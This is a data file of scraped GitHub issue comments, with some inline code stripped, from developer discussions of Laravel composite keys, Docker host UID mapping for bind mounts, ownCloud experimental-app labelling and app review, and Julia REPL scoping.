framework/laravel/5355/63573747,5355,"I put this in my Eloquent Model subclass to enforce my extra column ('locale').  Maybe it'll help someone. ♠php     protected function setKeysForSaveQuery(Builder $query)     {         parentsetKeysForSaveQuery($query);         $query-&gt;where('locale', '=', $this-&gt;locale);         return $query;     } ",,False
framework/laravel/5355/67331320,5355,plus one I just get an common error while saving model with composite keys♠` ,,False
framework/laravel/5355/72057268,5355,I want it! ,,False
framework/laravel/5355/72158649,5355,"-1 This is not ""should"" stuff. Please keep Eloquent simple. As you mentioned, query builder supported it, so it is enough. Don't do every thing by Eloquent. Just use query builder, results became collections in L5, so what problem? ",,False
framework/laravel/5355/72261848,5355,I doubt this will ever happen. ,,False
framework/laravel/5355/75343239,5355,"Why do you doubt this will ever happen? Composite keys are extremely common, if the SchemaBuilder supports it why wouldn't you want to have it supported by Eloquent as well? Sometimes using surrogate keys are wasteful, especially if you're using UUIDs as identifiers... having a useless column you never search on that just takes up table &amp; index space is silly sometimes. Keeping Eloquent ""simple"" is a very silly reason. To the end-user nothing changes - but they now have the ability to specify an array for the primary key. If Laravel/Eloquent really expects to be taken seriously and provide further credit for using PHP for web development it should naturally support what every other ORM supports for alternative web development libraries. Using pivot only is doable when you have a few extra columns on your relation... otherwise it's very awkward. Using the query builder for saving &amp; deleting is kind of silly, why would anyone want those inconsistencies in their code? Some places you use Eloquent for saving/deleting and some places you use QueryBuilder? This kind of attitude is poor and sounds lazy. If Laravel is open to receiving a feature like this, I would be more than willing to supply a nice simple and efficient solution. ",,False
framework/laravel/5355/77016178,5355,"plus one Maybe in 90% of my projects I use composite primary keys. For localisation and for one to many relationships composite keys is the best practice for me... I'm very dissapointed that in Laravel 5 there is no composite keys, but a lot of complicated design patterns. That is my opinion. Don't want to argue with anyone. ",,False
framework/laravel/5355/77033772,5355,"Eloquent follows the Active Record convention, so it needs a single primary key to work. If you need composite keys in your project, maybe Eloquent isn't the best tool for it. ",,False
framework/laravel/5355/77036060,5355,"The Active Record pattern makes no restrictions about primary keys - I don't know where you're getting that from. Eloquent/Laravel is currently developed to work with a single primary key, there's no reason why someone shouldn't be able to make a contribution to the project which adds composite keys. What is the best way to go about this? ",,False
framework/laravel/5355/77043680,5355,"All I'm saying is that this is a convention in other frameworks as well. Since Rails made it popular, the other frameworks followed the same path, that's what we see out there with most PHP frameworks (except Yii 2, for what I know). Don't get me wrong, I would love to see Eloquent working with composite keys but I agree with Campbell, we're not going to see that happen so soon and my opinion is that I don't think it's worth the trouble. Well, only Taylor can tell ) ",,False
framework/laravel/5355/77046617,5355,"If the current contributors aren't interested in implementing this feature, I'm more than willing to submit how I'm going to solve it (so I don't waste my time and have it be later rejected) - I just don't know who exactly to message to get the go ahead to work on it. ",,False
framework/laravel/5355/77048059,5355,Please pose questions to Taylor. He's the only one that can say yes/no to proposals. ,,False
framework/laravel/5355/77048144,5355,"As things stand, this issue is rejected, so it's unlikely for this to make it into the framework. ",,False
framework/laravel/5355/77366485,5355,@friend are you willing to accept a pull request for this proposal? ,,False
framework/laravel/5355/83238386,5355,"@friend please respond, I'd love this ",,False
framework/laravel/5355/83944404,5355,Just hit this bump as well. Would love support for composite keys. ,,False
framework/laravel/5355/90965240,5355,I want this feature badly. ,,False
framework/laravel/5355/90974643,5355,This seems like a package waiting to happen more than something that needs to be added to the framework. I agree with @friend . Just switch out your ORM to Doctrine 2? Is that a logical solution? Article here Doctrine Composite Keys ,,False
framework/laravel/5355/95302088,5355,Yes this would be great to have. ,,False
framework/laravel/5355/95648701,5355,I would also love to see this being implement within Eloquent.  Why would it be rejected as a proposal? If the $primaryKey property could be an array of columns it would be awesome. ,,False
framework/laravel/5355/107998144,5355,plus one for composite primary key support ,,False
framework/laravel/5355/111477673,5355,More one L5 user needs composite key =&gt; me !!! ,,False
framework/laravel/5355/111507996,5355,"Its works!!!  I ignored the model of the relationship table and set ""belongsToMany"" in the two tables with a little details set the two  foreign key of two tables and set the name of the relationship table. The whole foreign keys will works like a composite key. Ex //--------- Model ""Table1"" ------------// class Table1 extends Model { ... public function table2()     {         return $this-&gt;belongsToMany('App\Table2', 'table_relashionship', 'id_table2', 'id_table1');     } } //--------- Model ""Table2"" ------------// class Table2 extends Model { ... public function table1()     {         return $this-&gt;belongsToMany('App\Table1', 'table_relashionship', 'id_table1', 'id_table2');     } } Now the Eloquent undestand that you have a 'table_relashionship' in your database with columns 'id_table1' and 'id_table2' and you can access the data with the comand $table1 = Table2find(1); dd($table1-&gt;table2) Its solve my problem! ",,False
framework/laravel/5355/113053162,5355,"plus one for composite primary keys. In my opinion, using composite primary keys gives more clarity of the code as it shows that it is a dependent model (aggregate) of an entity model. Thus,  the dependent model cannot exists without its parent entity (or the aggregate root). ",,False
framework/laravel/5355/115407820,5355,"I am BAFFLED by the decisions being made. This is a COMMON practice in database design, and pushing people to hack their table designs to work with eloquent rather than support such a common practice is insane to me. ",,False
framework/laravel/5355/115410016,5355,"@friend to be fair, it is not supported by Rails either. It is not as if every major framework supports this and Laravel is refusing to. ",,False
framework/laravel/5355/115417969,5355,"@friend I'm in the same camp, I realize it's not a super requested feature, and even less so with new developers. And true, lots of other frameworks haven't done this either. It's actually a great thing that people are asking - what I hear them saying is they want to use Laravel! I feel like there are a few options for those of us in need of this functionality 1) Don't use eloquent, use query builder instead. 2) Don't use eloquent, use a different ORM like doctrine 3) Fork Eloquent to a new project and update it to support CK - let those that need it pull from that repo. Taylor can you share your vision of where Composite Keys fit in Laravel long term? i.e. Are CK's something you see as desirable, just further down the roadmap? Or are CK's something you feel are not a good fit for what you're trying to do with Laravel?  Jack  ",,False
framework/laravel/5355/115426172,5355,"I currently have no plans to implement composite key support. On Thursday, June 25, 2015, Jack notifications@friend.com wrote ",,False
framework/laravel/5355/115432155,5355,"Thanks Taylor, I appreciate the clarity! ",,False
framework/laravel/5355/115494838,5355,"Extend Laravel, make a package, release it and then all the peoples can use it. Just because its not part of the framework doesn't mean this can't be done. ",,False
framework/laravel/5355/121647027,5355,@friend A fork might be more appropriate. I've looked through all of the code myself and refactoring it to include composite keys provides an opportunity to clean up the code a bit (all of the joins due to relationships has a lot of repetitive string concatenation code). I think if you write out the few different ways to add conditions &amp; joins to a query in separate methods (on a new class?) it will give you a single place to handle the composite key logic instead of all over the Eloquent code base. Just my 2c ,,False
framework/laravel/5355/121649505,5355,"@friend Agree 100%, still a little way to go (I was crazy busy last week) but I've made good progress so far. I'm updating the database tests as I go which is a big time sink. ",,False
framework/laravel/5355/123746088,5355,I would enjoy seeing this myself too but I'm okay using the query builder to get the job done. It means I will have to update the timestamps myself but nothing major. ,,False
framework/laravel/5355/123750468,5355,"@friend I tried using query builder and I've got it working, but it's a ton more work, since you can't just assign the request data to the ORM to have it save a new record. So lots of mundane code to assign each and every field. @friend How is progress going on the fork?  I've considered trying doctrine, but I think a fork of Eloquent would be easier to use. ",,False
framework/laravel/5355/127943348,5355,"It's confusing that the builder can create primary composite keys while the Eloquent can't, kind of inconsistent, isn't it? ",,False
framework/laravel/5355/128032122,5355,@friend Not really. I'm pretty sure there are people who use the schema and query builder without Eloquent models. ,,False
framework/laravel/5355/128315346,5355,"@friend I'd argue that it's actually quite a disconnect between two integral parts of the framework.  One can build schema in such a way that it can't be used with the existing Eloquent API. It feels like a fight with the tooling, which is a red flag to me. The fact that these tools can be used independently is great but I think they should work together with feature parity in the first instance. ",,False
framework/laravel/5355/128322713,5355,plus one for composite primary keys. ,,False
framework/laravel/5355/128812228,5355,Me too. plus one for CK. ,,False
framework/laravel/5355/144310186,5355,"I was just silently listening this thread for a year, still nothing new? I'm playing with the idea of coding an Eloquent extension specifically for supporting comp keys until this feature comes out. ",,False
framework/laravel/5355/150525431,5355,this should be locked ,,False
framework/laravel/5355/150529199,5355,lol - I don't lock issues anymore because it causes massive rage ,,False
framework/laravel/5355/152518856,5355,Why should this issue be locked? ,,False
framework/laravel/5355/152519370,5355,Because of what Taylor said about this feature ,,False
framework/laravel/5355/152519704,5355,So just because other frameworks don't support it means Laravel doesn't need to? In fact I would think this would be a driving force TO support it since it will be yet one more feature it has that other frameworks don't. ,,False
framework/laravel/5355/152524210,5355,I (and a lot of others) totally agree with you. It's quite a common thing to use in database tables that simply don't require a 'id' field. ,,False
framework/laravel/5355/152543718,5355,"Taylor's response is interesting. It could one of a few things.  He doesn't think Laravel can/should be better than Rails. He knows this is an excuse for not wanting to do it himself. Could be lack of time or passion. He protests the idea of composite keys, because some folks actually think you should always have a surrogate key.  I don't mean to pick on him, he's done fantastic work, but with all of the support this issue has gotten I think we need a well thought out reason on why Laravel will never have composite keys OR, even better,  what can be done to get this done. After assessing what needs to be done to get composite keys working I can understand why he would want to avoid it. I think it would lead to a very healthy refactoring of the relationship classes. As I've said before, If he's willing to accept a patch for this feature there are many people who want to work on this. If he's hesitant because he has specific things in mind for this feature - or lines he wouldn't want crossed, he could communicate them to us on this issue. Outside of my work in PHP, ALL ORMS I've developed or used in the real world supported composite keys (Java might've spoiled me) so I find other libraries being hesitant a little odd. As I've said before, Laravel to me completely legitimizes developing large and well architected websites in PHP. The company I work for has used it dozens of times for small to large clients. It's definitely one of my favorite frameworks - save this one thing. Laravel's tagline shouldn't be ""At least as good as the competition"". ",,False
framework/laravel/5355/152545283,5355,@friend I don't think @friend would reject if you/anyone can come out with a complete Pull Request to add composite key support for Eloquent. You can't expect someone that doesn't use composite key him/herself to create such feature. I myself would never consider making that PR because I don't have all the knowledge to cover all possible use case. ,,False
framework/laravel/5355/157296472,5355,"I rarely use surrogate key if it's meaningless, and I use composite keys a lot in applications. I don't see a good reason to force using surrogate key. So please support composite keys in Eloquent. ",,False
framework/laravel/5355/157308273,5355,"May be if we collect enough ""plus one"" I will make the solution ",,False
framework/laravel/5355/157671662,5355,"Guys this is ridiculous, while I really enjoy working with Eloquent, the idea of adding a completely useless column just to ""make it work"" is unacceptable. This is such a no-brainer, Doctrine 2 does have native support for composite keys as well. Why not Laravel?! plus one! ",,False
framework/laravel/5355/158071202,5355,I would like composite keys plus one ,,False
framework/laravel/5355/160483799,5355,"plus one for composite primary keys, there's no good reason to force using surrogate key, is there? In addition, the fix proposed on #5517 is ridiculously simple and works flawlessly, I don't see why you wouldn't merge it on master. A pity. ",,False
framework/laravel/5355/160632899,5355,"Composite keys are really useful in use cases where you have an NxN table with a High read and write throughput. I guess one could argue in that case you don't use auto_increment, you should use a hash as primary_key instead of integer and suck it up using an UNIQUE constraint, but in my point of view this ""workaround"" is not the ideal scenario for a situation like this, it just creates confusion in something that should be simple. ",,False
framework/laravel/5355/161376267,5355,plus one I put here my own solution I'm using a Abstract Model which one final model has extended and in his private property of primaryKey I declared an array with the name of each field on my composite key. ,,False
framework/laravel/5355/162322797,5355,This is just sad. plus one for all its worth... ,,False
moby/moby/22415/151859257,22415,"Before getting into the details, I want to point out that I suspect a feature like what I'm about to suggest could solve many permission related snags when using Docker. So as to prevent this suggestion from getting mired in philosophical objections, this ticket is not advocating permanently storing credentials inside a container.  I don't do that and I don't suggest anyone else do it either!  tldr; The current method of UID spoofing inside of a container via  has limitations that end up mandating entire ecosystems of one-offs and very problematic workarounds to massage container state into the right frame of mind.  This is worsened by the fact that the need to perform these workarounds is influenced by what platform you are calling Docker from. The feature I'd like to request is to have a flag added to  (and equivalents) that tells Docker to map all filesystem operations that a container performs to a specific user host-side.  This is very different to  which simply sets the user of the process that runs inside the container. If you're interested in an extended explanation, read on!  Rationale We've all heard about people having issues with temporarily binding SSH credentials and similar  &amp;  related difficulties. Something that I've noticed when using Docker on OSX and Windows however is that I'm actually freed from the challenges of ensuring my ephemeral development containers (my primary use case) aren't writing files to the filesystem as root!  This is owed to the fact that they both rely on a variety of bridges back to the native platform's filesystem. One non-exclusive example is when trying to forward either an SSH socket or the SSH directory on a Linux host, because SSH insists on proper home directories, I've been unable to get secure connections working without having to make my container aware of the environment it is running in!  The best I've been able to dream up is bind mounting ,  and  into the container.  Which is exactly as horrible as it sounds, but also my only choice given that I don't know what uids will be right for the host filesystem.  This clearly runs against Dockers attitudes towards portability. Another more common example would be when files are created by the container, if the bound filesystem is ext or otherwise linux-compatible, the UID of files is set to root (or whoever I run my container as).  On Linux, in order to not blast my filesystem with files having UID/GID 0, I have to tell my containers to run their processes as my current user via . This might work in trivial scenarios, but again ends up falling apart in situations where the user system inside of the container is different to the host or the binaries being run enforce  directory requirements like SSH above.  No host is likely to ever have a reliable way to influence the user system inside the container.  This is especially true when using images produced by third parties. So, I currently am stuck avoiding the complexity by staying as root.  Everything works because all containers have a root user fully configured.  But now without any better option, all Docker containers that want to avoid being polluted with hacks are forced to write files as UID 0! As I mentioned above, switch over to Windows or OSX and this problem goes away because they don't share the same users as the container and the filesystems aren't compatible.  Instead, vboxsf, samba and other drivers are actually emulating the feature I'm requesting here! So, this clearly identifies the fact that while it's nice to control who the container runs its process as, it would actually be more desirable to optionally map the uid (and gid?) flag for any changes to the filesystem from the container, host-side. All the while, still allowing the container to function as whoever it needs to be internally. This jives with the philosophy that Docker containers should be portable and require zero awareness of the environment that is running them.  Indeed if you examine the nature of this suggestion, it's conceptually parallel to binding ports and bind mounting filesystems. We need a way to bind users as well. ",,False
moby/moby/22415/485826290,22415,@friend are you are of any progress or discussion that has been around this since your post? ,,False
moby/moby/22415/486790654,22415,"Nope, and I was even thinking about this issue today.  IIRC, @friend agreed with the value behind such a feature, might have been advocating for it internally (correct me if I'm wrong 😅). This is probably one of the more glaring oversights in the docker platform and in a strange twist, keeps me preferring to work with it on macOS/Windows instead of natively on linux! Feel free to retweet, this issue is as old as my daughter! ",,False
moby/moby/22415/486892381,22415,"If the main issue is to have the ability to bind-mount files from your host into a container, then this is largely the same issue as;   User namespaces - Phase 2  Add ability to mount volume as user other than root  And comes down to the ability to remap user-ids inside the container. This might be possible with a kernel that supports shiftfs or a FUSE filesystem. @friend did some work on something in this area in  (implementing a FUSE driver to do uid/gid remapping), and in a WIP pull request to use it for userns; ",,False
moby/moby/22415/486898958,22415,"Doesn't that end up requiring the container to have special setup? The idea here is that regardless of what the container chooses to do to the filesystem it sees, any writes coming out of it are abstracted to specific uid and/or gid. ",,False
moby/moby/22415/486900204,22415,"It's not something that should be (or could be) enabled by default, as;  docker won't know what mapping to make (i.e. wouldn't know what local uid/gid you want to map to which uid/gid inside the container) by default ignoring/mapping uid/gid means that a non-privileged user inside the container would get full access to bind-mounted files from the host (files which could be accessible to certain users only).  For Docker Desktop (Docker for Mac / Docker for Windows), the ""ignore ownership"" feature was implemented because Docker Desktop is targeted at developer use-cases, not for production (in production situations, giving a container access to files on the host is especially not desirable) ",,False
moby/moby/22415/487029036,22415,"I'm not sure I understand the distinction ~""people dev on Windows/macOS"" as I'm sure plenty of people develop on linux as well.  If that's really an explanation for the difference in behaviour, they surely need some equivalent that is easy to use. The mappings should be configured per volume.  So if I bind a volume to a container, I should be able to set a uid and/or gid that all write operations to that volume map out to on the host.  Internally the container will retain its own behaviour, but I can't have containers that write to uids and gids that might not even be configured on my host system. There is clearly a missing abstraction here. ",,False
moby/moby/22415/487038969,22415,"The missing abstraction is this is simply not possible on Linux without fuse. Docker for Mac uses fuse to do this, and it's horribly slow for most use cases. ",,False
moby/moby/22415/488292501,22415,"@friend - Sorry, can you elaborate?  I might not be following on that one, why would FUSE be necessary? Really, what this ticket represents applies regardless of what the current state of things is.  I don't think it's at all a stretch to say that my  and  can't possibly be expected to harmonize with every container and every permutation of them I can end up running.  Obviously the same applies for the containers own assumptions internal to themselves as well. As a practical but still contrived example If I'm running on a system and one container writes as , another uses  and another is using , they will all write as whatever the corresponding uid maps out to internally.  To the host though, those uids could end up being anything.  Worse still, between containers, you have a whole other set of permutations to deal with. To me, it seems like the only possible answer here is that we need some way during instantiation to abstract the filesystem operations that originate from within the container to the local system.  More importantly, this has to be possible without having to put that information in the containers themselves. Ideally Each container is responsible for its own security abstractions and when configured, have all operations performed on bound filesystems mapped to a specific uid/gid as defined by the host. ",,False
moby/moby/22415/488300988,22415,"FUSE is required because there is no way to do these mappings at the filesystem level. See ""shiftfs"" for an attempt to bring this into the kernel generically. ",,False
moby/moby/22415/488367817,22415,Would super be nice if docker abstracted something like that. ,,False
moby/moby/22415/490561851,22415,"Could we have an an option to use FUSE on Linux then? This issue causes huge amounts of problems for devs who use linux in our organisation and maintaining workarounds to let them do their jobs is irritating. I accept that there will be performance issues with that - but since we mostly use Docker for Mac that's really not a concern for us. I'd rather have ""slow and working"" over ""fast but broken"" any day. ",,False
moby/moby/22415/490646584,22415,FUSE support would be awesome!  A lot better than setting up rsync scripts which I'm doing now which is a pain.  I've also considered adding ssh service to my containers just to use sshfs to work around this issue. ,,False
moby/moby/22415/490657128,22415,I've been experimenting specifically with a filesystem for mapping UID/GID's mapped for user namespaces...  something like this might work for mapping a name in the container to a name on the host... I'd leave that to people who are interested in this. I guess we already process /etc/passwd in the container for  (but it's horrible and doesn't work for some cases). ,,False
core/owncloud/17122/90504961,17122,"On my local copy of master, I did not tick the box to show experimental apps and yet I see all the apps I installed myself, labelled as experimental. The first step would be to fix the bug and respect the tick box when showing/hiding non-approved apps. In 8.2, it would be great if the system could differentiate between a corporate, private app which was installed in a specific, trusted folder and one coming from the app store. ",,False
core/owncloud/17122/114659212,17122,Experimental apps only affect the one displayed in the categories from the appstore. – Nothing is filtered on already installed or disabled applications as this will give a wrong expectation what actually is installed. ,,False
core/owncloud/17122/114659770,17122,"Then I think the wording of that setting should be changed. It's not about enabling experimental apps, but about listing the ones which are available through the app store. ",,False
core/owncloud/17122/115223230,17122,@friend you might have an idea to get better UX on this one? ,,False
core/owncloud/17122/115231706,17122,"Well, you must have enabled experimental apps then before or installed apps locally. Which apps does this happen for? ",,False
core/owncloud/17122/115245967,17122,"It happens for all apps which were installed locally and which are not labelled as official. You can't have a tick box for ""Enable experimental apps"" and then still show them when it's disabled. Perhaps the description should be modified to ""List experimental apps from the app store"", but it might still be confusing if a user enables an experimental app, disables it, unticks the setting and still sees it listed in his ""Not enabled"" list, under ""Experimental applications ahead""... ",,False
core/owncloud/17122/115257762,17122,"For apps which are approved / official in the app store but you clone locally, the fix is at  – please review ) In the other cases I think the behavior is correct. ",,False
core/owncloud/17122/115261392,17122,"OK, that fix will at least remove the label from official/approved apps, but we still need to either filter out experimental apps if the switch is disabled or rename the switch to make it clear that it's only about the app store.  ",,False
core/owncloud/17122/115263740,17122,"Ah right! Ok so what we need to fix in this case is to not show experimental applications which are disabled, when the setting is not checked. (Sorry it took me so long to get it. ;) But when you checked »enable experimental apps«, then installed one, and then uncheck the setting again – that app should still be listed and be installed of course. Only once you disable it should it be removed from the list. So @friend can you submit a pull request for this? ) ",,False
core/owncloud/17122/115264787,17122,I disagree with this one. From my PoV we should show even untrusted applications even if they are disabled since the code is technically still existent on the server. – Either we change the wording or we leave it as-is (what I'd do) from my PoV. That local applications get an experimental rating if they don't have a rated OCS ID and no shipped tag is a whole other topic. ,,False
core/owncloud/17122/115266620,17122,"Maybe add a warning at the end of the list that experimental applications are not listed due to our preferences (something along those lines), just to make sure those apps are not forgotten? ",,False
core/owncloud/17122/115272170,17122,"Right, they still exist on the server. I don’t have strong design arguments either way so I think it’s fine to just keep it as it is. You installed stuff yourself after all, so it’s non-standard usage. If there’s massive confusion coming up, we can still change this. But for now I would say let’s keep it as it is. Ok @friend? (We’ll see how it’s received with the 8.1 release.) ",,False
core/owncloud/17122/115282581,17122,I think it wouldn't hurt to reword the title. The description needs to be rewritten anyway since it's not using proper English and is too aggressive. ,,False
core/owncloud/17122/115283438,17122,Keep in mind this warning is for regular admins who don’t necessarily all know what they are doing on their small instances. So it’s ok to state that there are likely to be security issues etc. ,,False
core/owncloud/17122/115287465,17122,"True, but it's the pot calling the kettle black. I've lost more data through the use of core apps than with 3rd party apps ;). Some points could be softened as follows ""... have not been as thoroughly tested"" ""... could cause unwanted side effects"" You have to think about the feelings of app devs who've spent a lot of time working on their projects and whose apps are instantaneously categorized as something to avoid, when an app like  per example, which is alpha quality and under ""heavy development"" gets the ""approved"" rating. ",,False
core/owncloud/17122/115288916,17122,"One more reason to quickly introduce channels ( So that even approved apps can be filtered out, depending on their stability. And I think ""Experimental"" is the wrong adjective. ""Untested"" maybe? ",,False
core/owncloud/17122/115376250,17122,"@friend you are welcome to join the ownCloud apps review team! ) Join #owncloud-app-review The Mail app was approved because well, it was thoroughly tested by @friend, @friend and me – so it’s basically design-, dev- and security-reviewed. Also, it’s in pretty wide use already and hasn’t eaten any emails. ) ",,False
core/owncloud/17122/115382738,17122,"I would probably only have time to review apps once a month S and I don't think I would approve many apps as most use private APIs and/or are missing descriptions. Regarding mail, I was referring to the statement made on the project's page in the app store. It's a 0.1 release ""under heavy development"" which is exactly how the apps settings page describes experimental apps.  I think you have to be careful how you manage this side of things. I've already heard devs grumble about how their work is being treated and @friend is hoping to increase the number of apps tenfold. That requires happy devs ) ",,False
core/owncloud/17122/115389917,17122,"As you know, the problem is always time. Any devs in particular who are unhappy about the state of app reviews? Then we should all get them into the app review team. ) ",,False
core/owncloud/17122/115393199,17122,"I agree that the problem is time, but for something as sensitive as app reviews, I think this needs to be semi-professionally done. People need to be trained, there needs to be a security review, etc. or the approved status is meaningless.  oC names dev an approver Approver approves apps with backdoors (easy to implement and easy to miss unless trained) by mistake Users start to find their data on public forums App is removed, etc., but it's too late, the damage is done  But even with a thorough review process, apps slip through... Look at all the nasty apps which went through Apple's net and they take their sweet time to review apps. On top of that oC doesn't have a remote kill switch... I need to open an issue about that. ",,False
core/owncloud/17122/115727464,17122,"@friend I just had a chat with @friend about a related topic and was wondering what you think How about we explicitly ask devs to submit their apps for reviewing? That makes sure that these devs have some kind of commitment and we can be sure that they at least in some way are dedicated to maintaining their app. Then from us (@friend, me and others) they will get code-, security- and design-feedback for their app. And eventually they get approved. I think a call for reviewing like this allows us to focus a bit. Currently one big problem is also that we simply don’t know where to start with the app reviews. If we have a simple submission queue we can work through that more easily. cc @friend if there’s any promo we need to do there. ",,False
core/owncloud/17122/115742210,17122,"I think it absolutely makes sense. All mobile devs have to do it in order for their apps to even show in the app stores. It will also help with the communication side and devs will be happy to get feedback on their work. Don't underestimate the amount of work involved on the approving side though. You'll need to publish reasonable acceptance criteria and stick to it. Also, if you're committed to make the AppFramework the preferred way to develop apps, you should definitely introduce a label for it, just like BlackBerry did with their ""Built for BlackBerry"" label. It definitely helps making a first selection. I try to avoid all apps which don't use the framework as it's almost certain they use private APIs and will break sooner rather than later (+ I wont be able to fix them as easily) ",,False
core/owncloud/17122/117115763,17122,"@friend a few thoughts.   -&gt; what do you think? This should at least explain our goals ;-) I think even if you have only time to review an app once a month it would still rock if you were able to join the review team. yes, reviews should be done professionally, but we can't limit the reviewers to ownCloud employees, imho. we probably should set up a wiki page where people can easily add a link to their app as a first step in getting a review queue. That would work, yes? That is a barrier for those app developers without a github account but it's a start. and the risks you mention - well, as you say, this even happened to Apple. It is probably not really possible to fully prevent that but once we're target for hackers like that, ownCloud must be so popular we will be able to afford a big team of ppl who review apps ;-) with regards to the wording we have to find a balance between 'properly' scaring (warning) users about the risk of entirely unreviewed apps and being nice to developers. I think the best solution is to ensure that apps get reviewed promptly so the ones in the 'experimental' category really are that - experimental. I know, this is an hard-to-achieve ideal but as @friend points out - that is why we need help ;-)  ",,False
core/owncloud/17122/117309367,17122,"Some thoughts about the documentation  Approved apps deemed "" to be stable for casual to normal use"" as opposed to be ready for serious use. What about if a MDM company creates a connector so that ownCloud can be used in their secure container and keeps it in their repo? ""minimum 5 ratings, average score 60/100 or better"". Unfortunately, I think the maths doesn't work here. Apps start at 50 and each click is worth 1 point. There is also an issue with how versioning works. 8.1 apps start at 50 again, so that might confuse users who see approved app with a rating of below 60 when the previous version was in the 70s or 80s. I like the notes about trust levels and audits. Gives a better idea of what is expected of devs to be approved ""warning shows for security/stability risks"" I still don't think it's a good idea. Name one mobile app store which labels its apps as possibly insecure or experimental, apart from the ones in the beta programmes. ""Apps can only use the public ownCloud API""  has to be modified to . The public API is not mature enough. An alternative could be to ask developers to request permission to use some APIs and approvers could use the list of well known methods which don't exist in the public space to vet apps. It would help guide devs into using the proper APIs in case they took the wrong approach and would help the core team better understand which APIs are missing. Why not force the use of the AppFramework for new apps? It would make things much easier to review. There are still a few typos left ;)  Regarding taking part in reviewing apps, I need to do a dry run to see if I can afford the time and if I would add any value to the process. I hate mailing lists, but it does make sense to ask for approval there. Maybe you should provide a template or a web submission form which would auto post to the list and all further communication would happen off list. The only reply to a list post should be that someone has been assigned to the task. After having read the publishing page, I feel better about the review process and the value of the approved label, but I still don't agree on the benefit of scaring away users. Show me another app store which treats its developers that way. If an app is approved by Apple, BlackBerry or Google, it's considered good enough to be of help to any user. Some apps may have a special ""verified"" label next the company name in some store so that you know you're getting the real thing, but it's usually not implied that they're superior. This is certainly not true of quite a few official oC apps which don't meet the criteria on that publishing page. If you get the man power, you could create a special Black label for official and approved apps which are of excellent quality. That could help users pick the superior Calendar, Tasks or Mail app instead of blindly trusting unmaintained ""official"" apps. ",,False
core/owncloud/17122/117312025,17122,"Won't happen. If something is missing app developers has to add new APIs to core but we won't approve apps that use the private API. There may be cases where we do accept excuses but this is not going to be the default and a ""should"" implies otherwise. - We should stay with the ""can"" here from my PoV. Mobile apps run sandboxed. We can't do this. Installing an ownCloud app really means ""all your data is going to be eaten"". There is a reason why we add a huge scary text. I mean we have no problem with giving 100 apps an approved rating as long as know that the developer is a somewhat trustworthy person and the app looks somewhat sane. But we should be scary. I'd go with something like ""should follow best practises, i.e. using the AppFramework and not deprecated APIs where possible"", but we should not make this an hard requirement. I mean if code works Fine. We can make it clear that using the AppFramework makes reviewing easier and thus makes us approve the app faster but we should not enforce the full technology stack. The latter part will be fixed with an upcoming AppStore update that @friend is working on. The same app in the appstore can then serve multiple versions. ",,False
core/owncloud/17122/117312072,17122,upcoming AppStore update === will very likely be in 8.1 ,,False
core/owncloud/17122/117316172,17122,"Everything which relates to public sharing is not in the public space and it's not something that an app dev can fix on its own. On top of that it would probably take 6-12 months to fix issues in core before being able to start working on the app. You have to be realistic about your expectations. Very few, if any, core apps pass the code_checker test. The ""do as I say, not as I do"" attitude is not the best way to get developers to work on expanding the ecosystem. A lot of apps come from the need to improve what's available in core, but devs might get discouraged because their app would be stuck in the experimental bin or frustrate users because of missing key functionalities. Good point, but they can still wipe your internal or external storage, wreck your contacts list, corrupt your calendar, etc. The user chooses to trust the app with his data. Works for me. Good news ) ",,False
core/owncloud/17122/117318046,17122,Which probably really means that the current public sharing API is not to be really expected to be widely used by third-party developers speak_no_evil Only with granting explicit permission. ,,False
core/owncloud/17122/117326430,17122,"Indeed, which means that 3rd party apps can't compete. Devs have to choose between getting their apps approved or give users what they want, leading to an unappealing app store littered with constrained and experimental apps dr_doom And that's a model you could follow, sort of. Get rid of the warning in the app store and add a warning which pops up when someone tries to enable an approved app. Would work with occ as well. ",,False
core/owncloud/17122/118036351,17122,"How about we get together and discuss this at the conf, see what we can improve. By that time we have had about 6-7 weeks of experience with it... I don't think this is, like, totally burning down, is it? ",,False
core/owncloud/17122/118069487,17122,"I think you should hold an open forum on these sort of issues, to try and get some feedback. You could also ask everyone to fill in a questionnaire since some people might not feel comfortable coming forward publicly. ",,False
core/owncloud/17122/118386752,17122,"well, we do mail to the ML and discuss it here ;-) That's about as much open forum as you can have here, I suppose. I'll also blog about this at some point soon. And there is the conference.... ",,False
core/owncloud/17122/118387822,17122,"Let's see how the change is received by the community at large. If people are unhappy, you'll know -&gt; No growth/defection, Twitter rants, blog posts, etc. I think the first reaction is going to be devs trying to get approved in order to avoid the experimental label and that's a good thing if approval or rejection happens within a week. I still think a form is a good idea because you can link to the terms and people won't be able to ignore your criteria. ",,False
core/owncloud/17122/118605282,17122,"yes, a form might be a good idea. But I don't see much effort put in until the release, at least not by me - I've been crazy busy with promotion/marketing preparations for the release, writing my fingers blue, editing videos etc. And everybody else is busy fixing bugs. So, for now - and maybe that is a mistake, but it is what it is - this is where we stand. Also note that apps, right now, would simply not show up AT ALL if they weren't added to the app store. Users had to install them manually. So in that regard, this is a step forward for most apps. And yes, the idea is of course to motivate app developers to try and get their app from 'experimental' to 'approved' ;-) ",,False
core/owncloud/17122/121226706,17122,"No problem about the form, just an idea. Maybe do an annual survey with some prices when there is not a release or a conference to organise? ;) In my experience, surveys have to be short or the incentive large (a copy of the $2000 report, etc.) ",,False
core/owncloud/17122/122257895,17122,"This is fixed, eh? @friend ",,False
julia/JuliaLang/28789/352373552,28789,"Example 1 This came up with a student who upgraded from 0.6 to 1.0 directly, so never even got a chance to see a deprecation warning, let alone find an explanation for new behavior Example 2 I ""get"" why this happens in the sense that I think I can explain, with sufficient reference to the arcana in the manual about what introduces scopes and what doesn't, but I think that this is problematic for interactive use. In example one, you get a silent failure. In example two, you get an error message that is very there-is-no-spoon. Thats roughly comparable to some Python code I wrote in a notebook at work today. I'm not sure what the rules are in Python, but I do know that generally you can't assign to things at the global scope without invoking global. But at the REPL it does work, presumably because at the REPL the rules are different or the same logic as if they were all are in the scope of function is applied. I can't language-lawyer the rules enough to propose the concrete change I would like, and based on Slack this isn't even necessarily perceived as an issue by some people, so I don't know where to go with this except to flag it. ",,False
julia/JuliaLang/28789/414539675,28789,"(Per @friend, this is the relevant change ",,False
julia/JuliaLang/28789/414544920,28789,I vaguely remember some discussion of one possibility to solve this issue being automatic wrapping of REPL entries in  blocks? ,,False
julia/JuliaLang/28789/414614359,28789,"But wouldn't that be confusing in that you couldn't do and use  after that? Unless  is inserted for all the toplevel assignments, I guess? ",,False
julia/JuliaLang/28789/414664339,28789,The behavior wouldn't be just to wrap everything in a  block—it's more complicated than that. You need to let-bind any global that's assigned inside the expression and then extract the let-bound value to a global at the end of the expression. ,,False
